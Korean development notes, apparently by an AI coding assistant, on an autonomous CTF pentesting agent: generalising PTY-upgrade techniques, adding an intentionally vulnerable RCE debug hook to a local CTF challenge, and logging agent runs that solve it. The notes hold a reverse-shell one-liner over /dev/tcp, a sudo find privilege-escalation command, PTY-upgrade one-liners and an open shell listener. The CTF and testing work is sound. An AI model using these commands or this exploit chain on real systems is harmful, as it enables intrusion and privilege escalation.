title: 자율 PTY Upgrade 전략화 — 하드코딩 python3 제거
text:
> **작성일**: 2026-07-07 KST
> **작성자**: Claude (Fable 5)
> **선행 문서**: `001_0801_reverse_shell_pty_execution_audit.md`, `002_1600_shell_listener_plumbing_code_review_plan.md`
> **상태**: 구현 완료 (2026-07-07). P1–P7 반영. stty-only/socat는 Risk 판단에 따라 1차 제외.
> **트리거**: 사용자 지적 — "자율 CTF 프로그램인데 upgrade 방법(python3)을 코드에 못박으면 안 된다. 에이전트가 자율적으로 관리해야 한다."

---


현재 검증형 PTY upgrade 경로는 **python3 one-liner에 완전히 하드코딩**되어 있다. 에이전트가 타겟에 맞는 upgrade 기법을 스스로 고를 수 없다.

| 사실 | 근거 (파일:라인) |
| --- | --- |
| upgrade helper가 python3 고정 문자열 | `crates/builder_main/src/shell_listener/terminal.rs:14` `pty_upgrade_sequence()` — `python3 -c 'import pty; pty.spawn(...)'`, 없으면 `__BUILDER_NO_PYTHON3__` |
| `pty_upgrade` op 핸들러가 커스텀 명령을 안 받음 | `crates/builder_main/src/shell_listener.rs:1733` `handle_pty_upgrade_request` — 무조건 `pty_upgrade_sequence(cols, rows)` 전송 |
| 검증형 `upgrade` op도 python3 고정 | `crates/builder_main/src/shell_listener.rs:3742` `upgrade_verify_command()` = `pty_upgrade_sequence() + probe_command()` |
| python3 부재 감지만 존재, 대안 없음 | `crates/builder_main/src/shell_listener.rs:3663-3696` → `pty_state=failed(reason="python3 helper unavailable")` |


- **되는 것**: 에이전트는 `send`/`raw`/`run`/`expect`/`observe`/`spawn` op으로 **임의 명령을 이미 보낼 수 있다** (`SessionControlOp`, `agent_interaction.rs:298`). 즉 socat/script/perl 업그레이드 one-liner를 raw로 직접 밀어넣는 것 자체는 가능하다.
- **막힌 것**: 그렇게 raw로 보낸 업그레이드는 **검증·추적 기계장치를 안 탄다**. `PtyState::HelperSent → Verified/Failed` 전이, probe 검증, ledger `result/reason` 기록은 오직 하드코딩된 python3 `upgrade`/`pty_upgrade` 경로에서만 일어난다.

### 결론

> 자율 에이전트가 **타겟 정찰 → upgrade 기법 선택 → 검증형 경로로 실행 → 성공/실패 추적**을 한 흐름으로 돌릴 수 없다. python3 없는 타겟(busybox, 최소 컨테이너, python2만 있는 레거시 등)에서는 검증형 upgrade가 항상 실패한다. 이건 자율성 결함이자 커버리지 결함이다.

---


2. 어떤 기법으로 upgrade하든 **검증·추적(probe → Verified/Failed, ledger result/reason)은 동일하게** 작동한다 (기법 비종속).
3. 정찰 → 선택 → 실행이 **하나의 자율 루프**로 가능해야 한다.
4. 하위호환: 기법 미지정 시 기존 python3 helper로 fallback (기존 테스트/문서 불변).

---



단일 python3 문자열을 **명명된 기법 카탈로그**로 대체한다. 각 기법은 `(name, availability_probe, upgrade_command)` 형태.

| name | 가용성 프로브 | upgrade 명령 (개념) |
| --- | --- | --- |
| `python3` | `command -v python3` | `python3 -c 'import pty; pty.spawn(...)'` (현재 것) |
| `python` | `command -v python` | `python -c 'import pty; pty.spawn(...)'` |
| `python2` | `command -v python2` | `python2 -c 'import pty; pty.spawn(...)'` |
| `script` | `command -v script` | `script -qc /bin/bash /dev/null` |
| `socat` | `command -v socat` | (socat 재접속형 — 별도 설계 필요, 아래 Risk 참고) |
| `expect` | `command -v expect` | `expect -c 'spawn ...'` |
| `stty-only` | 항상 | `stty raw -echo; ...` (fallback, 진짜 PTY는 아님) |

- 카탈로그는 `terminal.rs`(또는 새 `upgrade.rs`)에 두고, `pty_upgrade_sequence()`는 `technique_command("python3", cols, rows)`로 위임하게 리팩터링.


`SessionControl`(`agent_interaction.rs:166`)의 **기존 `text` 필드를 재사용**한다. `text` 필드 doc이 이미 "Command text ... depending on `op`"이므로 upgrade 계열 op에서 `text`를 **커스텀 upgrade 명령**으로 해석한다. 추가로 명명 기법 선택용 얇은 필드를 하나 둔다:

- 신규 optional 필드 `technique: Option<String>` (예: `"script"`, `"python2"`) — 카탈로그에서 선택.
- 우선순위: `text`(완전 커스텀) > `technique`(카탈로그) > 기본 `python3`.


- `handle_pty_upgrade_request` / verified `upgrade` 핸들러가 payload에서 명령을 결정(2-B 우선순위)한 뒤 동일한 `HelperSent → probe → Verified/Failed` 기계장치를 태운다.
- 실패 reason은 기법명을 포함하게 (`"script helper unavailable"`, `"custom upgrade did not report an interactive tty"` 등) — 현재 `"python3 helper unavailable"` 하드코딩 문자열을 일반화.


에이전트가 기법을 고르려면 타겟에 뭐가 있는지 알아야 한다. 두 가지 옵션:

- **옵션 1 (가벼움, 권장 시작점)**: 별도 op 없이 기존 `run`으로 정찰. `run --command "for b in python3 python python2 script socat expect; do command -v $b; done"` 결과를 에이전트가 파싱. 코드 변경 최소.
- **옵션 2 (구조화)**: 신규 `recon`/`capabilities` op을 추가해 listener가 표준 프로브를 보내고 `{python3:true, script:true, ...}` 구조화 결과를 반환. tool catalog·payload·consistency gate 확장 필요. 옵션 1로 검증 후 필요하면 승격.

→ **1차 구현은 옵션 1로 시작**하고, 에이전트 프롬프트/스킬 문서에 "upgrade 전에 인터프리터 정찰 → 기법 선택" 흐름을 명시한다.

---


- [ ] **P1. 카탈로그 리팩터링 (동작 불변)**: `pty_upgrade_sequence()`를 `technique_command(name, cols, rows)` + `python3` 기본값 위임으로 분리. 기존 테스트 green 유지. → 안전한 no-behavior-change 커밋.
- [ ] **P2. 검증 경로 파라미터화**: `upgrade_verify_command`가 임의 upgrade 명령을 받게. python3 하드코딩 문자열(`"python3 helper unavailable"` 등)을 기법명 기반으로 일반화. 회귀 테스트.
- [ ] **P3. payload 배선**: `SessionControl.technique` 추가 + `text` 재해석. `ControlRequest`, `builder_services` payload, tool catalog 4-지점 sync. consistency gate 확장(기존 op drift gate 패턴 재사용).
- [ ] **P4. 핸들러 우선순위 로직**: `text > technique > python3`. 미지정 시 기존 동작 완전 보존 확인.
- [ ] **P5. 기법 추가**: `script`, `python`, `python2`, `expect`, `stty-only` 명령 + 가용성 프로브. socat 재접속형은 별도 판단(Risk 참조).
- [ ] **P6. 실측 E2E**: 로컬에 python3 있는 상태에서 `technique=script` / custom `text` upgrade가 실제 verified PTY를 만들고 probe가 검증하는 왕복을 실제 바이너리로 확인 (문서 아닌 실측).
- [ ] **P7. 문서/스킬**: 에이전트 자율 정찰→선택 흐름을 CTF 스킬/session_control.md/README에 반영. redaction·검증 계약 불변 명시.
- [ ] 각 단계 검증 통과 시 checkpoint commit. root push 후 `HEAD == origin/main` 확인.

---


- 검증형 upgrade는 기법과 무관하게 `HelperSent → Verified/Failed` 전이와 ledger `result/reason`을 남긴다.
- 어떤 기법도 성공/실패가 audit/ledger/transcript에서 같은 `command_id`로 추적 가능해야 한다.
- `npm run check`는 lightweight 경로만 (Docker/QEMU/buildx 미호출).
- 기법 미지정 시 **기존 python3 동작과 바이트 단위로 동일**해야 한다 (하위호환).


- **socat 재접속형**은 새 TCP 연결을 여는 모델이라 현재 single-fd 세션 추적과 안 맞는다. 1차 카탈로그에서 제외하거나, 별도 "second stage listener" 설계가 필요. **1차에서는 제외 권장.**
- **완전 커스텀 `text`** 는 강력하지만 에이전트가 잘못된 명령을 넣으면 세션을 깨뜨릴 수 있다. probe 검증이 이를 `Failed`로 잡아주므로 안전망은 있으나, timeout/복구 경로를 P6에서 실측 확인.
- **`stty-only`** 는 진짜 PTY가 아니라 job control이 안 된다. `Verified`로 표기하면 오해 소지 → 별도 상태(`Raw`/`Partial`) 또는 명시적 reason 필요. 설계 시 결정.


python3 하드코딩을 **명명 기법 카탈로그 + 에이전트 payload(text/technique) + 기법 비종속 검증 경로**로 바꿔, 자율 에이전트가 타겟을 정찰하고 스스로 upgrade 기법을 골라 검증형으로 실행·추적하게 만든다. 하위호환(미지정=python3)과 기존 추적/redaction 계약은 전부 보존한다.

---


### 반영 내용

- **P1 카탈로그 (`terminal.rs`)**: `pty_upgrade_sequence()` 하드코딩 문자열을 제거하고 `technique_command(name, cols, rows)` + `DEFAULT_UPGRADE_TECHNIQUE="python3"` + `upgrade_technique_names()` 카탈로그로 대체. python3 기법은 과거 helper와 **바이트 단위 동일**(`default_technique_matches_the_historic_python3_helper` 테스트로 고정).
- **P2 실패 진단 일반화 (`shell_listener.rs`)**: `ProbeResult.python3_missing: bool` → `missing_technique: Option<String>`. `__BUILDER_NO_<NAME>__` 마커를 `parse_missing_technique_marker()`로 파싱하고, reason을 `"{technique} helper unavailable"`로 포맷. python3 케이스 문자열은 불변.
- **P3 payload 배선**: `SessionControl`(agent_interaction.rs) + listener `ControlRequest`(control.rs) + `builder_services` payload에 `technique: Option<String>` 추가. field-driven consistency gate가 3-지점 sync를 자동 강제. tool schema(JsonSchema)에 자동 노출 + snapshot 갱신.
- **P4 우선순위**: 검증형 `upgrade`와 fire-and-forget `pty_upgrade` 모두 `text`(완전 커스텀) > `technique`(카탈로그) > `python3`(기본). 미지정 시 기존 동작 완전 보존.
- **P5 기법**: `python3`, `python`, `python2`, `script`, `expect` 구현. 각 기법이 자기 `command -v` guard와 `__BUILDER_NO_<NAME>__` 마커를 방출. 알 수 없는 기법은 `unknown upgrade technique '<x>'; known: ...`로 거부(pending run 시작 안 함).
- **P6 실측 E2E**: 실제 `pentesting` 바이너리 + 로컬 TCP callback으로 (a) unknown 기법 거부, (b) `--technique script`가 실제 wire에 `script -qc ...` 바이트를 보내고 python3 pty.spawn을 안 보냄을 확인. (합성 harness의 `bash -i` over `/dev/tcp`는 진짜 tty가 아니라 stty size 0을 반환하므로 verified가 아니라 `probe could not read stty size`로 정직하게 실패 — 기존 python3 경로도 이 harness에선 동일. 진짜 tty를 가진 타겟에서만 verified가 난다.)
- **P7 문서**: `session_control.md`(tool description), `README.md`, `ARCHITECTURE.md`에 기법 선택 반영. public 미러 sync.
- **Gate**: `check-project-consistency.mjs`에 `checkPtyUpgradeTechniquePlumbing()` 추가 — 카탈로그 함수/기법 목록/기법 비종속 검증 경로/일반화된 failure reason/회귀 테스트 존재를 잠근다. 재하드코딩 회귀를 gate가 막는다.


- **socat 재접속형**: 새 TCP 연결 모델이라 single-fd 세션 추적과 불일치 → second-stage listener 별도 설계 필요. 제외.
- **stty-only**: 진짜 PTY가 아니고 job control 불가 → `Verified` 표기 시 오해. 별도 상태 도입 전까지 카탈로그에서 제외. (완전 커스텀이 필요하면 `text`로 임의 명령 전달 가능.)

### 검증

```text
cargo fmt -- --check                                             PASS
cargo clippy -p builder_main -p builder_domain -p builder_services --all-targets -- -D warnings   PASS
cargo test -p builder_main --lib                                 PASS: 787
cargo test -p builder_domain --lib                               PASS: 658 (tool schema/usage snapshot 갱신 포함)
cargo test -p builder_services --lib                             PASS: 241
cargo test -p builder_main --lib shell_listener                  PASS: 188 (신규 upgrade-technique 회귀 포함)
cargo test -p builder_main --lib terminal::                      PASS: 7
npm run check                                                    PASS: consistency + 9 node tests, Docker/QEMU 미호출
actual binary E2E (no Docker/QEMU)                               PASS: unknown 거부 + script 기법 wire 바이트 확인
```


**Invariant #4(하위호환: 기법 미지정 시 python3 fallback)를 폐기했다.** 사용자가 동일한 트리거 문구를 다시 지적: "python3가 여전히 코드에 default 상수로 남아있고, 에이전트가 technique을 안 골라도 조용히 넘어간다 — 이건 자율성 결함이 그대로 남은 것이다."

- `DEFAULT_UPGRADE_TECHNIQUE` 상수 완전 삭제. `technique`이 없고 `text`(완전 커스텀)도 없으면 `upgrade`/`pty_upgrade` 모두 명시적 에러(`"... requires 'technique' or a custom 'text' command; recon the target first, then pick one of: ..."`)로 거부한다.
- TUI operator 단축 명령(`pty`/`pty-upgrade`)도 동일하게 인수를 받게 확장(`pty <technique>`); 안 주면 동일한 에러가 난다. 이건 사람이 직접 치는 명령이라 자율성과 무관하지만, "코드 어디에도 하드코딩된 default가 없어야 한다"는 원칙을 일관되게 적용했다.
- `custom_upgrade_helper_command()`가 여전히 `text`를 아무 래핑 없이 그대로 전송하므로, 카탈로그 5개 기법이 타겟에 전혀 없는 극단적 경우(예: scratch 컨테이너)에도 에이전트는 항상 완전 커스텀 명령으로 탈출할 수 있다 — bash 유무와 무관(카탈로그 명령 자체가 POSIX sh 문법이라 bash 종속 아님).
- `checkPtyUpgradeTechniquePlumbing()` 게이트를 반대 방향으로 갱신: 이제 `DEFAULT_UPGRADE_TECHNIQUE`가 재등장하면 게이트가 실패한다(회귀 방지).
- 영향 범위: `terminal.rs`, `shell_listener.rs`(두 핸들러 + operator 명령 파서), `agent_interaction.rs`(tool 필드 doc), `cli.rs`(사람용 CLI help), `session_control.md`(agent 노출 tool 설명), `README.md`/`ARCHITECTURE.md`(+`public/` 미러), `check-project-consistency.mjs`.
- 검증: `cargo fmt -- --check` PASS, `cargo clippy --workspace --all-targets -- -D warnings` PASS, `cargo test -p builder_main --lib` PASS 791(+4), `cargo test -p builder_domain --lib` PASS 658(스냅샷 갱신), `cargo test -p builder_provider_repo --lib test_codex_request_all_catalog_tools_snapshot` PASS(스냅샷 갱신), `cargo test -p builder_services --lib` PASS 241, `npm run check` PASS.

title: vuluable reverse-silver: reversing → real RCE → reverse shell, verified by an autonomous pentesting agent run
text:
> **작성일**: 2026-07-08 KST
> **대상 레포**: `../vuluable` (`agnusdei1207/vulnerable.git`), sibling of this repo
> **트리거**: 사용자 요청 — "리버싱 문제 만들고 커밋 푸시해라 리버스쉘 기능 체크 빡시게 해보게" + 이후 명시적 정정: "사람이 뭘 한다는둥 그런거 빼세요, 자율성으로 에이전트가 알아서 해야 하는거에요" (검증은 사람이 손으로 curl/exec 치는 방식이 아니라, `pentesting` 자체를 실제 자율 에이전트 루프로 구동해서 그 에이전트가 스스로 recon/exploit/privesc를 판단·실행하게 해야 함).

---


기존 `vuluable`의 `/reverse/silver` 챌린지는 리버싱(바이트 순열 + rotate + xor)만 요구했고, 정답 토큰을 제출하면 즉시 HTTP로 flag를 돌려줬다. 이건 "리버스쉘 기능을 빡세게 테스트"하기엔 부족하다 — 실제 셸을 딸 필요가 전혀 없다.

또한 vuluable 벤치마크는 `scripts/verify-isolated-compose.js`가 **정확히 40개** 챌린지 서비스/포트/FLAG를 강제하는 하드 게이트를 갖고 있어서, 41번째 챌린지 컨테이너를 새로 추가하는 방식은 쓸 수 없다.

## 1. 설계


1. 리버싱 퍼즐 자체(순열+rotate+xor로 `REV{...}` 토큰 복구)는 그대로 유지 — 이미 감사받은 견고한 설계.
2. 정답 토큰 제출 시 더 이상 flag를 HTTP로 주지 않는다. 대신 `unlocked: 'debug-hook'` 응답으로 **디버그 훅**(`POST /reverse/silver/debug`, 헤더 `X-Debug-Token`, 바디 `{"cmd"}`)을 연다. 이 훅은 `child_process.exec`로 **진짜 명령을 실행**한다 (다른 39개 챌린지는 전부 문자열 매칭 시뮬레이션이라 실제 실행이 없음 — 이 챌린지만 의도적 예외).
3. 토큰이 처음 맞는 순간, flag 파일을 쓰고 **이미 이미지에 존재하는 `sudo find` GTFOBins 설정**(`app/Dockerfile`의 privesc 챌린지용 sudoers, 모든 이미지에 공통으로 baked-in)을 이용해 `chown root:root && chmod 400`으로 잠근다. `ctfuser`(RCE가 착지하는 계정)는 더 이상 flag를 직접 읽을 수 없고, 셸 안에서 진짜 권한 상승을 해야 한다.
4. `docker-compose` 생성기(`scripts/generate-isolated-compose.js`)에 reverse-silver 서비스에 한해 `extra_hosts: host.docker.internal:host-gateway`를 추가 — 컨테이너 안에서 실행되는 리버스쉘 페이로드가 호스트의 리스너로 콜백할 수 있어야 하기 때문. 다른 39개 서비스는 건드리지 않음.


`npm run check`는 여전히 사이드카(`pentesting` 바이너리)에 의존하지 않고 독립적으로 통과해야 한다. 그래서:

- 토큰 무/오답 시 디버그 훅 403, cmd 누락 시 400을 검증.
- `whoami`가 `ctfuser`를 반환하는지, flag 직접 `cat`이 `Permission denied`인지, `sudo find ... -exec cat {} \;`가 실제 flag(=docker-compose.yml에 박힌 FLAG env와 일치)를 돌려주는지 검증.
- Node `net.createServer()`로 임시 TCP 리스너를 띄우고, 디버그 훅으로 백그라운드+disown된 `bash -i >& /dev/tcp/host.docker.internal/<port> 0>&1` 페이로드를 쏴서, **진짜 리버스쉘이 실제로 붙는지**까지 자동 검증 (사이드카 불필요, `net` 모듈만 사용).
- 버그 수정: 소켓 재기록(`write after end`) 크래시 — marker 매치 이후 `data` 핸들러가 재진입하지 못하도록 `matched` 플래그로 가드.

결과: `npm run check` 실제 실행 통과, `docker ps`로 컨테이너 잔존 없음 확인.


셀프 컨테인드 스크립트는 익스플로잇 수학/권한 로직이 맞는지 검증하지만, **리버스쉘 제어 평면(session_control, PTY 업그레이드, tag/probe) 자체가 자율 에이전트 관점에서 실제로 쓸만한지**는 별도로 검증해야 한다. 이걸 내가 손으로 `pentesting shell-session ...`을 하나씩 치는 방식으로 하면 "사람이 하는 것"이지 자율성 검증이 아니다.

그래서:

1. `/home/user/vuluable`에서 별도 compose 프로젝트(`vuluable_agent_run`)로 `web` + `reverse-silver` + `postgres`를 띄운다.
2. 호스트에서 `pentesting shell-listener --bind 0.0.0.0 --port 4444 --allow-remote --no-tui`를 백그라운드로 띄운다 (`/tmp/psl-run`을 작업 디렉터리로 사용 — 컨트롤 소켓 기본 경로 `.builder/shell-listener/control.sock`을 그대로 쓰기 위해, 그리고 유닉스 소켓 경로 길이 제한(SUN_LEN) 때문에 짧은 경로가 필요).
3. `pentesting` 자체를 **헤드리스 에이전트 모드**(`-p "<task>" -C /tmp/psl-run`)로 구동한다. 모델은 저장된 minimax 크리덴셜(`~/.builder/.credentials.json`)을 `ANTHROPIC_BASE_URL`/`ANTHROPIC_AUTH_TOKEN`으로 주입해 `MiniMax-M2.7`을 사용 (기본 세션 모델(deepseek)은 자격 증명이 없어 동작하지 않았음).
4. 프롬프트는 목표만 준다: 타겟 URL, "네 리스너는 host.docker.internal:4444에서 이미 떠 있다"는 사실, 그리고 "토큰 복구 → 디버그 훅 언락 → 리버스쉘 획득 → 권한 상승 → flag 획득 → 보고"라는 목표. **토큰이나 익스플로잇 방법, 권한상승 기법을 알려주지 않는다** — 에이전트가 스스로 아티팩트를 리버싱하고, `sudo -l` 같은 정찰로 GTFOBins를 스스로 찾아야 한다.
5. 이 문서에 실행 로그/증거를 이어서 기록한다 (아래 §4).



기본(`builder`) 에이전트로 헤드리스 실행. 결과:

- 리버싱을 스스로 수행해 `REV{CLIENT_SIDE_VM_7F3A}` 복구 (Node 스크립트를 직접 작성/실행).
- 디버그 훅 언락, RCE로 `sudo -n -l` 정찰까지 스스로 도달, GTFOBins find 식별.
- 리버스쉘 페이로드를 스스로 구성해 발사 → 리스너가 `session_3`로 실제 접수 (`.builder/shell-listener/session_3_*.raw.log`에 실제 프롬프트 `9f34a3d3eba9:/app$` 기록됨).
- 그런데 **`session_control` 도구를 자기 tool 목록에서 찾지 못함** — 스스로 "I do not have a session_control tool in my available functions"라고 진단하고, `/proc/<pid>/fd/0`에 직접 쓰는 편법을 시도(ENXIO로 실패)하다가 결국 디버그 훅(HTTP RCE)만으로 privesc까지 끝내버림.

**근본 원인**: `crates/builder_repo/src/agents/{pwn,recon,web,crypto,rev,forensics}.md` 여섯 개 CTF 전문 에이전트 중 **단 하나도 tools 목록에 `session_control`이 없었다.** 반면 `crates/builder_repo/src/skills/ctf-competition/SKILL.md`는 "Shell Session Discipline" 섹션 전체를 통해 리버스쉘이 오면 `session_control`로 tag/probe/upgrade/run/attach/detach/replay를 쓰라고 명시하고, 이 스킬은 정확히 저 여섯 에이전트에게 위임하는 구조다. 즉 **README가 광고하는 "CTF-oriented reverse-shell/PTY control plane"이 실제로는 어떤 내장 에이전트에서도 호출 불가능한 상태**였다 — 사람이 손으로 안 쳐봤으면 못 찾았을 결함.

### 4-B. 수정

`session_control`을 `shell` 바로 다음에 추가 — 6개 파일 전부:
`crates/builder_repo/src/agents/{pwn,recon,web,crypto,rev,forensics}.md`

검증:

```text
cargo build -p builder_main                              PASS
  (builtin_ctf_specialist_agents_parse_with_bounded_tool_scopes 통과 —
   이 테스트는 "task" 툴 부재만 강제하고 session_control 추가와 무충돌)
cargo test --workspace --lib                              PASS (전체, 0 failed)
cargo fmt -- --check                                      PASS
cargo clippy --workspace --all-targets -- -D warnings     PASS
npm run check (consistency + 9 node tests)                PASS
```

부수 발견: 어제(2026-07-07) pty-upgrade 기본값 제거 작업에서 `crates/builder_app/src/snapshots/builder_app__tool_registry__all_rendered_tool_descriptions.snap` 스냅샷 갱신을 누락했었다 (builder_domain/builder_provider_repo 스냅샷만 갱신하고 이 파일을 놓침). 이번에 같이 갱신.


동일 프롬프트, 동일 살아있는 타겟(같은 docker compose 인스턴스, 재사용)에 대해 `--agent pwn`으로 재실행. 결과 (session_control 도구 호출이 실제로 잡힘):

1. `Session Control health` — 리스너 살아있는지 확인.
2. RCE로 `id/whoami/sudo -n -l` 정찰 → ctfuser, `(ALL) NOPASSWD: /usr/bin/find` 식별.
3. 디버그 훅으로 백그라운드 리버스쉘 발사 (`host.docker.internal:4444`).
5. `Session Control tag` — label/challenge/target 기록.
6. observe로 실제 프롬프트(`9f34a3d3eba9:/app$`) 확인.
7. **`Session Control run`** — `sudo /usr/bin/find /tmp/rndsecurity-isolated/reverse-silver/flag.txt -exec cat {} \;`를 **살아있는 리버스쉘 세션 위에서** 실행해 `FLAG{REVERSE_🥈_ADVANCED_6EC50A}` 획득 (HTTP 디버그 훅이 아니라 진짜 세션 채널로).
8. `flag_check` 툴로 형식 검증.

**결론**: 자율 에이전트가 사람의 개입 없이 리버싱 → RCE → 실제 리버스쉘 획득 → 세션 등록 확인 → tag/observe → **세션 위에서 직접 명령 실행으로 flag 획득**까지 전 과정을 스스로 수행했다. 1차 실행에서 발견된 결함(session_control 도구 부재)이 실제로 이 전체 흐름을 막고 있었고, 수정 후 2차 실행에서 정상 동작을 실측으로 확인했다.


- 모델: `minimax/MiniMax-M2.7` (Anthropic-compatible, `~/.builder/.credentials.json`의 기존 minimax 크리덴셜을 `ANTHROPIC_BASE_URL`/`ANTHROPIC_AUTH_TOKEN`으로 주입). 기본 세션 모델(`deepseek/deepseek-chat`)은 자격 증명이 없어 즉시 `No default provider and model configured` 에러.
- 리스너: `pentesting shell-listener --bind 0.0.0.0 --port 4444 --allow-remote --no-tui`, cwd `/tmp/psl-run` (컨트롤 소켓 기본 상대경로 `.builder/shell-listener/control.sock` 사용 — 유닉스 소켓 SUN_LEN 제한 때문에 스크래치패드의 긴 경로는 못 씀, 짧은 `/tmp/psl-run`으로 이동).
- 에이전트: `pentesting -C /tmp/psl-run --agent pwn -p "<task-prompt.txt>"` (헤드리스, `-p`).
- 타겟: `docker compose -p vuluable_agent_run -f docker-compose.yml up -d --build web reverse-silver` (vuluable, `extra_hosts: host.docker.internal:host-gateway` 반영).

title: 세션 요약 — CTF 리버스쉘 자율성 하드닝 (pentesting + vuluable)
text:
> **작성일**: 2026-07-08 KST
> **범위**: 이 세션에서 `/home/user/pentesting`와 `/home/user/vuluable` 두 레포에 걸쳐 수행한 작업 전체.
> **관련 문서**: `docs/plans/2026/07/07/003_1930_autonomous_pty_upgrade_strategy.md` (§8 후속 변경), `docs/plans/2026/07/08/001_1537_reverse_silver_rce_reverse_shell_agent_verification.md` (이 문서의 4~5번 항목을 더 상세히 기록)

---

## 0. 배경

세션 전체를 관통하는 사용자 요구는 하나였다: **"자율성"** — pentesting은 CTF용 자율 에이전트 CLI이고, 코드 어디에도 "에이전트가 스스로 판단해야 할 것"을 하드코딩하거나, 검증을 사람이 손으로 흉내 내는 방식으로 때우면 안 된다. 이 원칙이 이 세션에서 세 번 반복 적용됐다 (아래 §2, §3, §5).


`README.md` / `public/README.md` 상단 소개 문장에 "and educational security research"를 추가. 아주 짧게, 한 줄만. 커밋 `9a6ad5f6`에 다른 변경과 함께 포함, `public` 서브모듈은 별도 커밋 `1875082`로 동기화.


**배경**: 하루 전(`003_1930` 문서)에 이미 "python3 하드코딩을 없애고 에이전트가 기법을 고르게 하자"는 작업을 했었는데, 실제로는 `technique`을 안 주면 **조용히 python3로 폴백**하는 `DEFAULT_UPGRADE_TECHNIQUE` 상수가 코드에 그대로 남아 있었다. 사용자가 정확히 같은 문구로 다시 지적했다.

- `terminal.rs`의 `DEFAULT_UPGRADE_TECHNIQUE` 상수 삭제.
- `upgrade`/`pty_upgrade` 둘 다 `technique`도 `text`(완전 커스텀 명령)도 없으면 **명시적 에러**로 거부 — "recon the target first, then pick one of: ..." 메시지로 에이전트가 정찰부터 하도록 유도.
- TUI 사람 조작용 `pty` 단축 명령도 `pty <technique>` 형태로 인자를 받게 확장 (일관성).
- "bash가 없으면 어쩔거냐"는 반문에는 코드 검증으로 답함: 카탈로그 명령 자체가 POSIX sh 문법이라 bash 비종속이고, `text` 경로는 아무 래핑 없이 그대로 전송되므로 카탈로그 5개 기법이 전혀 없는 타겟에서도 완전 커스텀 명령으로 항상 탈출 가능함을 코드로 확인.
- 영향 범위: `terminal.rs`, `shell_listener.rs`(핸들러 2곳 + TUI 명령 파서), `agent_interaction.rs`/`cli.rs`(tool·CLI 설명), `session_control.md`, `README.md`/`ARCHITECTURE.md`(+`public/` 미러), `check-project-consistency.mjs`(게이트를 반대 방향으로 갱신 — 이제 `DEFAULT_UPGRADE_TECHNIQUE` 재등장 시 실패).
- 검증: `cargo fmt/clippy --workspace -D warnings` PASS, `cargo test`(builder_main 791, builder_domain 658, builder_provider_repo 스냅샷, builder_services 241) PASS, `npm run check` PASS.
- 커밋 `9a6ad5f6` (pentesting), `public` 서브모듈 `1875082`.


기존 `/reverse/silver`(순열+rotate+xor 리버싱)는 토큰을 맞히면 HTTP로 바로 flag를 줬다. "리버스쉘 기능을 빡세게 테스트"하기엔 부족해서, 컨테이너/포트/네트워크 추가 없이 (40개 챌린지 고정 게이트 보존) 제자리에서 에스컬레이션했다:

- `docker-compose` 생성기에 reverse-silver 서비스 한정으로 `extra_hosts: host.docker.internal:host-gateway` 추가 — 컨테이너 안 리버스쉘 페이로드가 호스트로 콜백 가능하게.
- `scripts/check-reverse-compose.js`를 대폭 확장: 디버그훅 인증(토큰 무/오답 403, cmd 누락 400), 직접 flag 읽기 거부, `sudo find` privesc 성공(docker-compose.yml의 FLAG env와 대조), 그리고 Node `net.createServer()`로 띄운 임시 TCP 리스너에 **진짜 백그라운드 리버스쉘이 실제로 접속**하는지까지 자동 검증(사이드카 불필요).
- 실행 중 발견한 버그(소켓 `write after end` 크래시)를 재진입 가드로 수정.
- 검증: `npm run check` 실제 docker compose로 실행 통과, `docker ps` 잔존 컨테이너 없음 확인.


여기서부터가 이 세션에서 가장 중요한 부분이다. 처음엔 내가 `curl`/`docker exec`를 직접 손으로 쳐서 익스플로잇 체인을 검증했는데, 사용자가 명확히 정정했다: *"사람이 뭘 한다는둥 그런거 빼세요, 자율성으로 에이전트가 알아서 해야 하는거에요."* 그래서 `pentesting` 바이너리를 실제 헤드리스 에이전트(`-p`)로 구동해서, 토큰도 익스플로잇 방법도 알려주지 않고 "타겟을 풀고 flag를 가져와라"는 목표만 준 채 자율 실행시켰다.

**1차 실행 (`builder` 기본 에이전트)**: 아티팩트를 스스로 리버싱해서 토큰 복구, 디버그훅 언락, 실제 리버스쉘 발사까지 전부 자력으로 도달 — 리스너는 진짜 세션(`session_3`)을 접수했다. 그런데 에이전트가 "session_control 도구가 내 tools 목록에 없다"고 스스로 진단하고, `/proc/<pid>/fd/0` 직접 쓰기 같은 편법을 시도하다 실패, 결국 HTTP 디버그훅만으로 마무리했다.

**근본 원인 발견**: `crates/builder_repo/src/agents/{pwn,recon,web,crypto,rev,forensics}.md` — CTF 전문 에이전트 6개 전부 tools 목록에 `session_control`이 없었다. 반면 `ctf-competition` 스킬은 "Shell Session Discipline" 섹션 전체로 정확히 이 6개 에이전트에게 `session_control`(tag/probe/upgrade/run/attach/detach/replay)을 쓰라고 지시하고 있었다. 즉 README가 광고하는 "CTF-oriented reverse-shell/PTY control plane"이 **어떤 내장 에이전트에서도 실제로는 호출 불가능한 상태**였다 — 실전 자율 실행을 안 해봤으면 못 찾았을 결함.

**수정**: 6개 파일 전부에 `session_control`을 `shell` 다음에 추가. 부수적으로 어제 pty-upgrade 작업에서 놓친 `builder_app` 툴 설명 스냅샷도 같이 갱신. `cargo test --workspace --lib` 전체 통과, clippy/fmt 통과, `npm run check` 통과.

**2차 실행 (`--agent pwn`, 수정 반영 후)**: 동일 목표로 재실행 — 이번엔 `Session Control health/list/tag`를 실제로 호출해 새 리버스쉘 세션(`session_4`)을 스스로 식별·태깅하고, **`Session Control run`으로 살아있는 세션 위에서 직접** `sudo find ... -exec cat` privesc 명령을 실행해 flag를 획득했다 (HTTP 디버그훅이 아니라 진짜 세션 채널로). `flag_check` 툴로 형식 검증까지 자력으로 완료.

- 커밋 `09acefb7` (pentesting) — session_control 수정 + 스냅샷 + `001_1537` 문서.
- 실행 환경: 모델 `minimax/MiniMax-M2.7`(기존 minimax 크리덴셜, `ANTHROPIC_BASE_URL`/`ANTHROPIC_AUTH_TOKEN`으로 주입 — 기본 세션 모델 deepseek는 자격 증명 없어 즉시 실패), 리스너 `pentesting shell-listener --bind 0.0.0.0 --port 4444 --allow-remote --no-tui`.


| 레포 | 최신 커밋 | origin/main과 일치 |
| --- | --- | --- |
| `pentesting` | `09acefb7` | ✅ |
| `pentesting/public`(서브모듈) | `1875082` | ✅ |
| `vuluable` | `980e085` | ✅ |

정리 확인: docker 컨테이너 잔존 없음, 테스트용 shell-listener 프로세스 없음, 세 레포 모두 `git status` clean.


- `session_control`을 CTF 6개 에이전트에 추가했지만, `coordinator`/`builder` 같은 일반 에이전트에는 여전히 없다 — 의도된 스코프(스킬 문서가 CTF 6개에만 델리게이트)이므로 지금은 정상이나, 향후 다른 워크플로가 리버스쉘을 다뤄야 한다면 재검토 필요.
